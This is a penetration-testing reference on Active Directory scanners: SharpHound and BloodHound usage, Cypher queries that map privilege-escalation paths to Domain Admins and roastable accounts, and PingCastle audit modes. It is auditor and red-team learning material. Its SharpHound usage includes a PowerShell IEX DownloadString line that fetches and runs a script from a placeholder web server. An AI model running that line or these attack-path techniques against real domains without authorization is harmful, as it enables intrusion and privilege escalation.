# Active Directory - Automatic scanners

### BloodHound

`BloodHound` uses graph theory to reveal the hidden and often unintended
relationships within an Active Directory environment. `BloodHound` can be used
to easily identify highly complex attack paths that would otherwise be
impossible to quickly identify.

The official installation procedure is available on the `GitHub` repository:
`https://github.com/BloodHoundAD/BloodHound/wiki/Getting-started`

###### SharpHound

`SharpHound` is a C# data ingestor used by `BloodHound` to enumerate the Active
Directory targeted domain. A PowerShell script `SharpHound.ps1`, in-lining the
C# DLL, is available as well.

By default, `SharpHound` will output multiples JSON files in a compressed zip
archive file that can directly be imported for graphical review and query in
`BloodHound`.

Multiples collection methods are available:

| CollectionMethod | Description |
|------------------|-------------|
| Default | Performs group membership collection, domain trust collection, local admin collection, and session collection |
| Group | Performs group membership collection |
| LocalAdmin | Performs local admin collection |
| LocalGroup | Performs local groups collection. No longer uses the `NetLocalGroupGetMembers` Windows API, rely instead on lower-levels API calls to the `SAMRPC` library to access the remote computer SAM |
| RDP | Performs Remote Desktop Users collection |
| DCOM | Performs Distributed COM Users collection |
| GPOLocalGroup | Performs local admin collection using Group Policy Objects |
| Session | Performs session collection |
| ComputerOnly | Performs local admin, RDP, DCOM and session collection |
| LoggedOn | Performs privileged session collection (requires admin rights on target systems) |
| Trusts | Performs domain trust enumeration |
| ACL | Performs collection of ACLs |
| Container | Performs collection of Containers |
| DcOnly | Performs collection using LDAP only. Includes Group, Trusts, ACL, ObjectProps, Container, and GPOLocalGroup. |
| All | Performs all Collection Methods except GPOLocalGroup |

Usage:

```
# Import-Module SharpHound.ps1
# IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/SharpHound.ps1');
Invoke-Bloodhound -Verbose -CollectionMethod  all
Invoke-Bloodhound -Verbose -Domain '<DOMAIN>' -DomainController '<DC>' -LDAPUser '<USERNAME>' -LDAPPass '<PASSWORD>' -CollectionMethod  all

SharpHound.exe -v -Domain '<DOMAIN>' -DomainController '<DC>' -LDAPUser '<USERNAME>' -LDAPPass '<PASSWORD>' -c all
```

###### BloodHound GUI

The following commands can be used to start `BloodHound`. The default neo4j
credentials are `neo4j:neo4j` and must be changed for the first login.

```
# Windows
net start neo4j
.\BloodHound.exe

# Linux
neo4j start
bloodhound
```

The zip archive files produced by `SharpHound` can simply be drag and dropped
in the `BloodHound` graphical interface for treatment. The `Upload` button
on the right may be used as well.

###### BloodHound / Neo4j Cypher queries

*Neo4j Cyper 101*

The `Neo4j` graph databases implements its own query language: `Cypher`. Raw
`Cypher` queries can be made directly through the `BloodHound` GUI interface,
in complement to the predefined `BloodHound` queries. Queries may also be
executed through the `Neo4j` console (by default accessible using the `Neo4j`
web interface at `http://localhost:7474/browser/`). The `Neo4j` console
automatically display by default all the edges between nodes, which may be
useful in some case but is more resources intensive.

`Cypher` is a "visual" language modeling a starting and ending nodes, linked by
an edge. Queries are constructed using parenthesis, brackets, and arrow, with a
very basic query looking like:

```
(StartNode)-[IsConnectedTo]->(EndNode)
```

`Cypher` implements two basic clauses, `MATCH` and `RETURN`:
  - The `MATCH` clause specify the patterns `Neo4j` will search for in the
  database. `MATCH` is often coupled to a `WHERE` conditional statement that
  adds restrictions to the data retrieved.  
  - The `RETURN` clause defines what to include in the query result
  set, which can be nodes, relationships, or nodes / relationships properties.

The relationship type and depth can be specified inside the brackets. For
instance, the following link `-[r:MemberOf]->` specify that the starting node
should be a direct member of the group ending node, while the link
`-[r:MemberOf*1..]->` indicate that the `MemberOf` relationship may repeat any
number of time and thus the starting node may be recursively a member of the
group ending node.     

`Neo4j` `Cypher` also implements the `shortestPath` and `allShortestPaths`
functions that return, respectively, the shortest path and all the shortest
paths (all paths with the same minimal amount of hops) from a starting node,
or set of nodes, to an ending node, or set of nodes.

The following basic queries illustrate the use of the `MATCH` and `RETURN`
clauses as well as the linking syntax:

```
# Returns all Nodes in the database
MATCH (X) RETURN X

# Returns all domain in the database (and their relationships if executed through the Neo4j console)
MATCH (X:Domain) RETURN X
# With relationships from BloodHound GUI
MATCH p=(n:Domain)-[r]-(m:Domain) RETURN p

# Returns all users in the database
MATCH (X:User) RETURN X

# Returns all groups in the database
MATCH (X:Group) RETURN X

# Returns all computers in the database
MATCH (X:Computer) RETURN X

# Returns all OU in the database
MATCH (X:OU) RETURN X

# Returns all GPO in the database
MATCH (X:GPO) RETURN X

# Return the <OBJECT> (User, Group, Computer, OU or GPO) <NAME> (SAMACCOUNTNAME@DOMAIN_FQDN). Both queries are equivalent.
MATCH (n:<OBJECT> {name:"<NAME>"}) RETURN n
MATCH (n:<OBJECT>) WHERE n.name = "<NAME>" RETURN n

# Return the security principals directly member of the specified group <GROUP> (SAMACCOUNTNAME@DOMAIN_FQDN)
MATCH p=(n)-[b:MemberOf]->(c:Group {name: "<GROUP>"}) RETURN p

# Return all the security principals recursively member of the specified group <GROUP> (SAMACCOUNTNAME@DOMAIN_FQDN)
MATCH p=(n)-[b:MemberOf*1..]->(c:Group {name: "<GROUP>"}) RETURN p

# Return the path of the specified relationship type from any object to any objects
MATCH p=()-[r:<RELATIONSHIP>*1..]->() RETURN p

# Return shortest path from the Domain Users group to Domain Admins group
MATCH (g:Group) WHERE g.name =~ 'DOMAIN USERS@.*' MATCH (g1:Group) WHERE g1.name =~ 'DOMAIN ADMINS@.*' OPTIONAL MATCH p=shortestPath((g)-[r:MemberOf|HasSession|AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|CanRDP|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|Contains|GpLink|AddAllowedToAct|AllowedToAct|SQLAdmin*1..]->(g1)) RETURN p

# Return all shortest paths from Domain Users to Domain Admins
MATCH (g:Group) WHERE g.name =~ 'DOMAIN USERS@.*' MATCH (g1:Group) WHERE g1.name =~ 'DOMAIN ADMINS@.*' OPTIONAL MATCH p=allShortestPaths((g)-[r:MemberOf|HasSession|AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|CanRDP|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|Contains|GpLink|AddAllowedToAct|AllowedToAct|SQLAdmin*1..]->(g1)) RETURN p
```

The following operators are supported in the conditional `WHERE` statements:

| Operator | Definition |
|----------|-----------|
| NOT | Negate the subsequent condition |
| = | Is equal to |
| <> | is different to |
| < | Is less than |
| <= | Is less or equal
| > | Greater than |
| >= | Is greater or equal to |
| IS NULL | Is null |
| IS NOT NULL | Is not null |
| STARTS WITH | String starts with |
| ENDS WITH | String ends with |
| CONTAINS | String contains |
| =~ | String RegEx search |

The relationship between nodes can be of the following types:
  - `AddAllowedToAct`
  - `AddMember`
  - `AdminTo`
  - `AllExtendedRights`
  - `AllowedToAct`
  - `AllowedToDelegate`
  - `CanPSRemote`
  - `CanRDP`
  - `Contains`
  - `ExecuteDCOM``
  - `ForceChangePassword`
  - `GenericAll`
  - `GenericWrite`
  - `GetChanges`
  - `GetChangesAll`
  - `GPLink`
  - `HasSession`
  - `HasSIDHistory`
  - `Owns`
  - `MemberOf`
  - `ReadGMSAPassword`
  - `ReadLAPSPassword`
  - `SQLAdmin`
  - `TrustedBy`
  - `WriteDACL`
  - `WriteOwner`

For more information about the `Neo4j` `Cypher` language, its use in
`BloodHound` and `BloodHound` in general, the following resource may be
consulted:

```
https://www.ernw.de/download/BloodHoundWorkshop/ERNW_DogWhispererHandbook.pdf#page=45&zoom=100,92,390
```

*Custom Cypher Queries*

Most of the queries below are from or inspired from on previous work from
`@Haus3c`.

The following queries were validated in the `Neo4j` console.

```
# Find all users with an SPN (kerberoastable users)            
MATCH (n:User) WHERE n.hasspn=true RETURN n

# Find all users with an SPN (kerberoastable users) with passwords last set > 5 years ago       
MATCH (u:User) WHERE u.hasspn=true AND u.pwdlastset < (datetime().epochseconds - (1825 * 86400)) AND NOT u.pwdlastset IN [-1.0, 0.0] RETURN u.name, u.pwdlastset order by u.pwdlastset

# Find SPNs all users with an SPN containing the specified keywords <KEYWORD>      
MATCH (u:User) WHERE ANY (x IN u.serviceprincipalnames WHERE toUpper(x) CONTAINS '<KEYWORD>')RETURN u

# Find all users that do not require Kerberos pre-authenticationan SPN (AS_REP roastable users)            
MATCH (n:User) WHERE n.dontreqpreauth=true RETURN n

# TO TEST
# Domains Admins and Enterprise Admins sessions opened on computers except Domain Controllers
OPTIONAL MATCH (c:Computer)-[:MemberOf*1..]->(t:Group) WHERE NOT t.objectid ENDS WITH '-516' WITH c as NonDC MATCH p=(NonDC)-[:HasSession]->(n:User)-[:MemberOf]->(g:Group) WHERE g.objectid ENDS WITH '-512' OR g.objectid ENDS WITH '-519' RETURN DISTINCT (n.name) as Username, COUNT(DISTINCT(NonDC)) as Connexions ORDER BY COUNT(DISTINCT(NonDC)) DESC
OPTIONAL MATCH (c:Computer)-[:MemberOf]->(t:Group) WHERE NOT t.name = 'DOMAIN CONTROLLERS@TESTLAB.LOCAL' WITH c as NonDC MATCH p=(NonDC)-[:HasSession]->(n:User)-[:MemberOf]->(g:Group {name:”DOMAIN ADMINS@TESTLAB.LOCAL”}) RETURN DISTINCT (n.name) as Username, COUNT(DISTINCT(NonDC)) as Connexions ORDER BY COUNT(DISTINCT(NonDC)) DESC

# [Neo4j console] Computers, except Domain Controllers, that are trusted to perform unconstrained delegation
MATCH (c1:Computer)-[:MemberOf*1..]->(g:Group) WHERE g.objectid ENDS WITH "-516" WITH COLLECT(c1.name) AS domainControllers MATCH (c2:Computer {unconstraineddelegation:true}) WHERE NOT c2.name IN domainControllers RETURN c2.name,c2.operatingsystem ORDER BY c2.name ASC

# Shortest path from Everyone, Anonymous, Authenticated Users, Domain Users or Domain Computers to Enterprise Admins, Domain Admins, KRBTGT, domain built-in Administrator, Domain Controllers,	Cert Publishers, Schema Admins, Key Admins, Enterprise Key Admins, Account Operators, Server Operators, Print Operators or Backup Operators
MATCH (g:Group) WHERE g.objectid ENDS WITH '-513' OR g.objectid ENDS WITH '-515' OR g.objectid ENDS WITH 'S-1-5-11' OR g.objectid ENDS WITH 'S-1-1-0' OR g.objectid ENDS WITH 'S-1-5-7' MATCH (m:Group) WHERE m.objectid ENDS WITH 'S-1-5-9' OR m.objectid ENDS WITH '-500' OR m.objectid ENDS WITH '-502' OR m.objectid ENDS WITH '-512' OR m.objectid ENDS WITH '-516' OR m.objectid ENDS WITH '-517' OR m.objectid ENDS WITH '-518' OR m.objectid ENDS WITH '-519' OR m.objectid ENDS WITH '-526' OR m.objectid ENDS WITH '-527' OR m.objectid ENDS WITH '-548' OR m.objectid ENDS WITH '-549' OR m.objectid ENDS WITH '-550' OR m.objectid ENDS WITH '-551' MATCH p=allShortestPaths((g)-[r:MemberOf|HasSession|AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|CanRDP|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|Contains|GpLink|AddAllowedToAct|AllowedToAct|SQLAdmin|ReadGMSAPassword|HasSIDHistory|CanPSRemote*1..]->(m)) RETURN p

# Direct and potentially involuntary control (direct link with out MemberOf) of Everyone, Anonymous, Authenticated Users, Domain Users or Domain Computers to any domain objects
# Adding the "MemberOf" relationship type may greatly complexify the reading of the resulting graph
MATCH (source_object:Group) WHERE source_object.objectid ENDS WITH '-513' OR source_object.objectid ENDS WITH '-515' OR source_object.objectid ENDS WITH 'S-1-5-11' OR source_object.objectid ENDS WITH 'S-1-1-0' OR source_object.objectid ENDS WITH 'S-1-5-7' MATCH p=(source_object)-[r:AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|CanRDP|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|GpLink|AddAllowedToAct|AllowedToAct|SQLAdmin*1..]->(vulnerable_object) RETURN p
# Table form for exporting the results from the neo4j's console
MATCH (source_object:Group) WHERE source_object.objectid ENDS WITH '-513' OR source_object.objectid ENDS WITH '-515' OR source_object.objectid ENDS WITH 'S-1-5-11' OR source_object.objectid ENDS WITH 'S-1-1-0' OR source_object.objectid ENDS WITH 'S-1-5-7' MATCH p=(source_object)-[r:AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|CanRDP|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|GpLink|AddAllowedToAct|AllowedToAct|SQLAdmin*1..]->(vulnerable_object) RETURN source_object.name,vulnerable_object.name

# More queries: https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/
```

###### (Dirty) Manual analysis of SharpHound results

For larger Active Directory domains, specifics search on the `SharpHound`
resulting JSON files may be used to more rapidly identify entry point, such as
resources accessible to following groups:
- `Everyone`, SID: `S-1-1-0`
- `Anonymous`, SID: `S-1-5-7`
- `Authenticated Users`, SID: `S-1-5-11`
- `Users`, SID: `S-1-5-32-545`
- `Domain Users`, SID: `S-1-5-<DOMAIN>-513`
- `Domain Computers`, SID: `S-1-5-<DOMAIN>-515`

The following bash script can be used to convert the one-line JSON result of
`SharpHound` to a more human readable format:

```
#!/bin/bash
for filename in *.json; do
  echo $filename
  jq --color-output . $filename > $filename.jq
done
```

```
grep -A 10 -B 10 -rin "S-1-1-0\|S-1-5-7\|S-1-5-11\|S-1-5-32-545" *.jq
```

###### [Linux] BloodHound Owned

The `bh-owned.rb` ruby script can be used to automatically tag the provided
users from a file as owned or blacklist.

```
ruby bh-owned.rb -u neo4j -p <NEO4J_DB_PASSWORD> -a <COMPROMISED_USERS_FILE>
```

Note that the usernames must correspond to the `BloodHound` expected node
format: `UPPERCASE_USERNAME@UPPERCASE_DOMAIN_FQDN`.

```
$users_file=<USERNAMES_FILE>
$users_fqdn=<UPPERCASE_DOMAIN_FQDN>

touch ./tmp_file
cat $users_file | while read line; do
  echo $line"@"$users_fqdn >> ./tmp_file
done

awk '{print toupper($0)}' < ./tmp_file > formated_users_file.txt
rm -rf ./tmp_file

ruby bh-owned.rb -u neo4j -p <NEO4J_DB_PASSWORD> -a <COMPROMISED_USERS_FILE>
```

### PingCastle

`PingCastle` is an C# application designed to run a number of security checks,
targeting the most common Active Directory security issues.    

Note that the licensing model of `PingCastle` specify the following:
  - "Except if a license is purchased, you are not allowed to make any profit
  from this source code"
  - "It is allowed to run PingCastle without purchasing any license on for
  profit companies if the company itself (or its ITSM provider) run it"

So in order to legally make use of `PingCastle`, a license must be purchased or
the scans must be conducted by the audited company and the results communicated
to the auditors.

`PingCastle` can be launched using the current user security context or with
a specified account using:

```
PingCastle.exe --server <DC_FQDN | DC_IP> --user "<DOMAIN>\<USERNAME>" --password "<PASSWORD>" --interactive
```

The `healthcheck` mode runs more that fifty checks, including:
  - enumeration of the operating systems in use
  - enumeration of Active Directory privileges group memberships and
  users with the admincount bit set to 1 (AdminSdHolder)
  - verification of privileges security principals' and GPO's ACLs
  - presence of GPP passwords and restricted groups definition in GPO
  - implementation of LAPS and Windows Event Forwarding
  - security principals that can have an empty password or vulnerable to
  Kerberoast or ASP-Roast
  - enumeration of trusts
  - verification if the `Exchange Windows Permissions` security principal has
  the `WriteDacl` right in the root domain security descriptor
  - etc.

Note that before running the `healthcheck`, the limitation of 100 users in the
generated HTML report can be deleted: `6-advanced -> 4-noenumlimit`.

The `permissions` mode runs a number of group memberships, GPO mapping and ACL
checks to create an Active Directory compromission graph, similar to what can
be accomplished through `BloodHound`. In the generated
`Active Directory compromission Graph`, a graph can be visualized in the
`Detailed analysis` section by clicking on the `Analysis` link.

`PingCastle` can also be used to run a number of specific security scans:

| Scan | Description |
|------|-------------|
| `aclcheck` | Check authorization related to users or groups. Default to everyone, authenticated users and domain users. |
| `antivirus` | Check for computers without known antivirus installed. It is used to detect unprotected computers but may also report computers with unknown antivirus. |
| `laps_bitlocker` | Check on the AD if LAPS and/or BitLocker has been enabled. Default check for all the computers in the domain. |
| `localadmin` | Enumerate the local Administrators of the specified computer or all computers in the domain. |
| `nullsession` | Check if null sessions are enabled. |
| `share` | List all shares published on the specified computer or all computers in the domain and determine if the share can be accessed by anyone. |
| `smb` | Scan the specified computer or all computers in the domain and determine the smb version available. Also check if SMB signing is enabled. |
| `spooler` | Check if the spooler service is remotely active on the specified computer or all computers in the domain. |
| `startup` | Get the last startup date of the specified computer or all computers in the domain. Can be used to determine if latest patches have been applied. |
